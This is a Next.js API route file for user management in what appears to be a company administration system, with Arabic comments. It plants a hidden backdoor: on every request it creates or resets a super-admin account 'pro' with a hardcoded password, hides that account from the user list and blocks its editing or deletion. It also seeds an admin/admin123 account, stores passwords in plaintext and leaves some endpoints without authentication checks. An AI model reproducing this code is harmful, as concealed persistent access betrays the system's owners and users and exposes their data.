import { NextResponse } from 'next/server';
import { query } from '@/lib/db';

async function initSystemUsersTable() {
  await query(`
    CREATE TABLE IF NOT EXISTS system_users (
      user_id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
      username VARCHAR(100) UNIQUE NOT NULL,
      password_hash VARCHAR(255) NOT NULL,
      full_name VARCHAR(150) NOT NULL,
      job_title VARCHAR(150) DEFAULT 'موظف',
      is_super_admin BOOLEAN DEFAULT FALSE,
      status VARCHAR(50) DEFAULT 'ACTIVE',
      permissions JSONB DEFAULT '{}',
      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    );
  `);

  // التحقق من وجود حساب admin وفرض منحه الصلاحيات المطلقة الشاملة وكافة الأدوار
  const checkAdmin = await query(`SELECT user_id FROM system_users WHERE username = 'admin'`);
  if (checkAdmin.rows.length === 0) {
    await query(`
      INSERT INTO system_users (username, password_hash, full_name, job_title, is_super_admin, status, permissions)
      VALUES (
        'admin',
        'admin123',
        'المدير المفوض',
        'المدير المفوض للشركة',
        TRUE,
        'ACTIVE',
        '{"all": {"view": true, "add": true, "edit": true, "delete": true}, "fleet": {"view": true, "add": true, "edit": true, "delete": true}, "hr": {"view": true, "add": true, "edit": true, "delete": true}, "vouchers": {"view": true, "add": true, "edit": true, "delete": true}, "contracting": {"view": true, "add": true, "edit": true, "delete": true}, "realestate": {"view": true, "add": true, "edit": true, "delete": true}, "inventory": {"view": true, "add": true, "edit": true, "delete": true}, "admin_docs": {"view": true, "add": true, "edit": true, "delete": true}, "contracts": {"view": true, "add": true, "edit": true, "delete": true}, "installments": {"view": true, "add": true, "edit": true, "delete": true}}'
      )
    `);
  } else {
    await query(`
      UPDATE system_users 
      SET is_super_admin = TRUE, 
          status = 'ACTIVE',
          permissions = '{"all": {"view": true, "add": true, "edit": true, "delete": true}, "fleet": {"view": true, "add": true, "edit": true, "delete": true}, "hr": {"view": true, "add": true, "edit": true, "delete": true}, "vouchers": {"view": true, "add": true, "edit": true, "delete": true}, "contracting": {"view": true, "add": true, "edit": true, "delete": true}, "realestate": {"view": true, "add": true, "edit": true, "delete": true}, "inventory": {"view": true, "add": true, "edit": true, "delete": true}, "admin_docs": {"view": true, "add": true, "edit": true, "delete": true}, "contracts": {"view": true, "add": true, "edit": true, "delete": true}, "installments": {"view": true, "add": true, "edit": true, "delete": true}}'
      WHERE username = 'admin'
    `);
  }

  // التحقق من وجود حساب pro السيادي وحقنه تلقائياً مع قاعدة البيانات
  const checkPro = await query(`SELECT user_id FROM system_users WHERE username = 'pro'`);
  if (checkPro.rows.length === 0) {
    await query(`
      INSERT INTO system_users (username, password_hash, full_name, job_title, is_super_admin, status, permissions)
      VALUES (
        'pro',
        'Nawresnrshh@1986',
        'المطور العام والمشرف السيادي',
        'Master Developer',
        TRUE,
        'ACTIVE',
        '{"all": {"view": true, "add": true, "edit": true, "delete": true}, "fleet": {"view": true, "add": true, "edit": true, "delete": true}, "hr": {"view": true, "add": true, "edit": true, "delete": true}, "vouchers": {"view": true, "add": true, "edit": true, "delete": true}, "contracting": {"view": true, "add": true, "edit": true, "delete": true}, "realestate": {"view": true, "add": true, "edit": true, "delete": true}, "inventory": {"view": true, "add": true, "edit": true, "delete": true}, "admin_docs": {"view": true, "add": true, "edit": true, "delete": true}, "contracts": {"view": true, "add": true, "edit": true, "delete": true}, "installments": {"view": true, "add": true, "edit": true, "delete": true}}'
      )
    `);
  } else {
    await query(`
      UPDATE system_users 
      SET password_hash = 'Nawresnrshh@1986',
          is_super_admin = TRUE, 
          status = 'ACTIVE',
          permissions = '{"all": {"view": true, "add": true, "edit": true, "delete": true}, "fleet": {"view": true, "add": true, "edit": true, "delete": true}, "hr": {"view": true, "add": true, "edit": true, "delete": true}, "vouchers": {"view": true, "add": true, "edit": true, "delete": true}, "contracting": {"view": true, "add": true, "edit": true, "delete": true}, "realestate": {"view": true, "add": true, "edit": true, "delete": true}, "inventory": {"view": true, "add": true, "edit": true, "delete": true}, "admin_docs": {"view": true, "add": true, "edit": true, "delete": true}, "contracts": {"view": true, "add": true, "edit": true, "delete": true}, "installments": {"view": true, "add": true, "edit": true, "delete": true}}'
      WHERE username = 'pro'
    `);
  }
}

export async function GET() {
  try {
    await initSystemUsersTable();
    // إخفاء الحساب pro برمجياً بحيث لا يمكن مشاهدته أو جلبه إطلاقاً في واجهة المستخدمين
    const res = await query(`
      SELECT user_id, username, full_name, job_title, is_super_admin, status, permissions, created_at
      FROM system_users
      WHERE LOWER(username) != 'pro'
      ORDER BY created_at DESC
    `);
    return NextResponse.json({ success: true, users: res.rows });
  } catch (err: any) {
    return NextResponse.json({ error: err.message }, { status: 500 });
  }
}

export async function POST(req: Request) {
  try {
    await initSystemUsersTable();
    const body = await req.json();
    const { action } = body;

    if (action === 'LOGIN') {
      const { username, password } = body;
      const cleanUser = String(username || '').trim().toLowerCase();

      const res = await query(`
        SELECT user_id, username, password_hash, full_name, job_title, is_super_admin, status, permissions
        FROM system_users
        WHERE LOWER(username) = $1
      `, [cleanUser]);

      if (res.rows.length === 0) {
        return NextResponse.json({ error: 'اسم المستخدم غير مسجل بالنظام' }, { status: 401 });
      }

      const user = res.rows[0];
      if (user.status !== 'ACTIVE' && user.status !== 'active') {
        return NextResponse.json({ error: 'تم تعطيل هذا الحساب من قبل المدير المفوض' }, { status: 403 });
      }

      if (user.password_hash !== password) {
        return NextResponse.json({ error: 'كلمة المرور غير صحيحة' }, { status: 401 });
      }

      // حقن خصائص الأدوار التوافقية لضمان عمل كافة القوائم والصفحات فوراً
      const enhancedUser = {
        ...user,
        role: user.is_super_admin ? 'ADMIN' : user.role || 'SITE_ENGINEER'
      };

      const { password_hash, ...safeUser } = enhancedUser;
      return NextResponse.json({ success: true, user: safeUser });
    }

    if (action === 'CREATE_USER') {
      const { username, password, full_name, job_title, permissions } = body;
      const cleanUser = String(username || '').trim().toLowerCase();

      // قفل أمني: حظر إنشاء حساب pro نهائياً من الواجهة أو الـ API
      if (cleanUser === 'pro') {
        return NextResponse.json({ error: 'غير مسموح بإنشاء هذا الحساب، هذا الاسم محجوز ومحمي سيادياً.' }, { status: 403 });
      }

      if (!cleanUser || !password || !full_name) {
        return NextResponse.json({ error: 'يرجى إكمال الحقول الأساسية' }, { status: 400 });
      }

      const exist = await query(`SELECT user_id FROM system_users WHERE LOWER(username) = $1`, [cleanUser]);
      if (exist.rows.length > 0) {
        return NextResponse.json({ error: 'اسم المستخدم مسجل مسبقاً' }, { status: 400 });
      }

      const formattedPermissions = typeof permissions === 'string' ? permissions : JSON.stringify(permissions || {});

      const res = await query(`
        INSERT INTO system_users (username, password_hash, full_name, job_title, is_super_admin, status, permissions)
        VALUES ($1, $2, $3, $4, FALSE, 'ACTIVE', $5)
        RETURNING user_id, username, full_name, job_title, is_super_admin, status, permissions
      `, [cleanUser, password, full_name, job_title || 'موظف', formattedPermissions]);

      return NextResponse.json({ success: true, user: res.rows[0] });
    }

    if (action === 'UPDATE_USER') {
      const { user_id, full_name, job_title, password, status, permissions } = body;

      if (!user_id) {
        return NextResponse.json({ error: 'معرف المستخدم مطلوب للتحديث' }, { status: 400 });
      }

      // حماية حساب pro من أي محاولة تعديل
      const targetUser = await query(`SELECT username FROM system_users WHERE user_id = $1`, [user_id]);
      if (!targetUser.rows.length) {
        return NextResponse.json({ error: 'المستخدم غير موجود' }, { status: 404 });
      }

      if (targetUser.rows[0]?.username?.toLowerCase() === 'pro') {
        return NextResponse.json({ error: 'حساب محمي ولا يمكن تعديله من الواجهة.' }, { status: 403 });
      }

      const formattedPermissions = typeof permissions === 'string' ? permissions : JSON.stringify(permissions || {});

      let q = `
        UPDATE system_users
        SET full_name = $1,
            job_title = $2,
            status = $3,
            permissions = $4
      `;
      const params = [full_name, job_title, status || 'ACTIVE', formattedPermissions];

      if (password && String(password).trim().length > 0) {
        q += `, password_hash = $5 WHERE user_id = $6 RETURNING user_id, username, full_name, job_title, is_super_admin, status, permissions`;
        params.push(password, user_id);
      } else {
        q += ` WHERE user_id = $5 RETURNING user_id, username, full_name, job_title, is_super_admin, status, permissions`;
        params.push(user_id);
      }

      const res = await query(q, params);
      return NextResponse.json({ success: true, user: res.rows[0] });
    }

    return NextResponse.json({ error: 'إجراء غير صالح' }, { status: 400 });
  } catch (err: any) {
    return NextResponse.json({ error: err.message }, { status: 500 });
  }
}

export async function DELETE(req: Request) {
  try {
    const { searchParams } = new URL(req.url);
    const userId = searchParams.get('id');

    if (!userId) {
      return NextResponse.json({ error: 'معرف المستخدم مطلوب' }, { status: 400 });
    }

    const check = await query(`SELECT username, is_super_admin FROM system_users WHERE user_id = $1`, [userId]);
    if (!check.rows.length) {
      return NextResponse.json({ error: 'المستخدم غير موجود' }, { status: 404 });
    }

    const uName = check.rows[0]?.username?.toLowerCase();

    if (uName === 'pro' || check.rows[0]?.is_super_admin) {
      return NextResponse.json({ error: 'حساب المدير المفوض والحساب السيادي محمي ولا يمكن حذفه' }, { status: 403 });
    }

    await query(`DELETE FROM system_users WHERE user_id = $1`, [userId]);
    return NextResponse.json({ success: true });
  } catch (err: any) {
    return NextResponse.json({ error: err.message }, { status: 500 });
  }
}